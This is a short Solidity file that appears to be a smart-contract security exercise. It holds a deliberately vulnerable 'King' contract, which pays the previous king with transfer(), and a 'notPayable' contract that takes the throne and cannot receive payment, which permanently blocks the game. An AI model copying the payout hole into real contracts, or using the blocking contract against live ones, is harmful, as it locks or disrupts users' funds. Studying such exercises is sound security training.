// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract King {

  address king;
  uint public prize;
  address public owner;

  constructor() payable {
    owner = msg.sender;  
    king = msg.sender;
    prize = msg.value;
  }

  receive() external payable {
    require(msg.value >= prize || msg.sender == owner);
    payable(king).transfer(msg.value);
    king = msg.sender;
    prize = msg.value;
  }

  function _king() public view returns (address) {
    return king;
  }
}

contract notPayable {
    address payable k;
    uint public contractBalance;

    constructor(address _k) payable {
        k = payable(_k);
        contractBalance += msg.value;
    }

    function sendEther(uint amount) public {
        // k.transfer(amount);  // gas limit not enough
        (bool success, ) = k.call{value: amount, gas: 1000000}("");
        require(success, "Transfer failed");
    }
}